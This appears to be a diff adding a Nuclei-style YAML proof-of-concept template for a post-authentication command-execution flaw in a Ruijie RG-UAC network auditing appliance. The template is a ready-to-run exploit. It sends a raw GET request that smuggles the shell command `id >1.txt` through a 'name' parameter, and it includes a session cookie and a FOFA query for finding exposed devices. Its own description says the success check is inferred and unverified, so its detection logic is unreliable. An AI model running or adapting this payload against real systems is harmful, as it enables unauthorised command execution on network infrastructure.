@@ -1,0 +1,29 @@
+id: poc-6adca8268be2b1921743
+info:
+  name: 锐捷RG-UAC统一上网行为管理审计系统interface_commit后台命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6adca8268be2b192174392918f9c3b04
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6adca8268be2b192174392918f9c3b04
+    fofa: + fofoa:`app="Ruijie-RG-UAC"`
+http:
+- raw:
+  - 'GET /view/networkConfig/physicalInterface/interface_commit.php?name=`id+>1.txt` HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: PHPSESSID=ae63a240e1fdfb5614107040d19120f3
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
